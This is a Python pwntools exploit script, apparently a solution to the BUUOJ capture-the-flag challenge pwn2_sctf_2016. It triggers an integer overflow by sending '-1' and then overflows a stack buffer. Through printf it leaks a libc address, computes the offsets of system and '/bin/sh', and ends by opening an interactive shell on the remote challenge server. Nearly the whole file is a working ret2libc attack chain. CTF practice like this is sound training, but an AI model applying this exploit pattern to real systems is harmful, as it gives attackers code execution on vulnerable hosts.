'''
@Author       : 白银
@Date         : 2023-04-18 15:01:38
@LastEditors  : 白银
@LastEditTime : 2023-04-18 16:00:20
@FilePath     : /pwn/pwn2_sctf_2016.py
@Description  : https://buuoj.cn/challenges#pwn2_sctf_2016
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './pwn2_sctf_2016'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 29307)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

payload = flat(['-1'])  # 整数溢出
io.sendline(payload)
io.recvuntil("\n")

printf_plt = elf.plt['printf']
print("printf_plt------", hex(printf_plt))
printf_got = elf.got['printf']
print("printf_got------", hex(printf_got))
main_addr = elf.sym['main']
print("main_addr------", hex(main_addr))

padding = 0x2c + 4  # ida看，nptr的上限和r差多少

payload2 = flat(['a' * padding, printf_plt, main_addr, printf_got]) # 泄露libc
io.sendline(payload2)
io.recvuntil("\n")
# print("io.recvline()-------", io.recvline())
printf_addr = u32(io.recv(4))
# printf_addr = u32(io.recvline()[:-1].ljust(4, b'\x00'))
print("printf_addr------", printf_addr)
# libc = finder('printf', printf_addr)
libc_base = printf_addr - libc.symbols['printf']
print("libc_base------", hex(libc_base))
system_addr = libc_base + libc.symbols['system']
print("system_addr------", hex(system_addr))
bin_sh_addr = libc_base + libc.search(b'/bin/sh').__next__()
print("bin_sh_addr------", hex(bin_sh_addr))

io.sendline(payload) # setvbuf(stdout, 0, 2, 0);会不断刷新输入缓冲区

payload3 = flat(['a' * padding, system_addr, main_addr, bin_sh_addr]) # attack
io.sendline(payload3)

io.interactive()
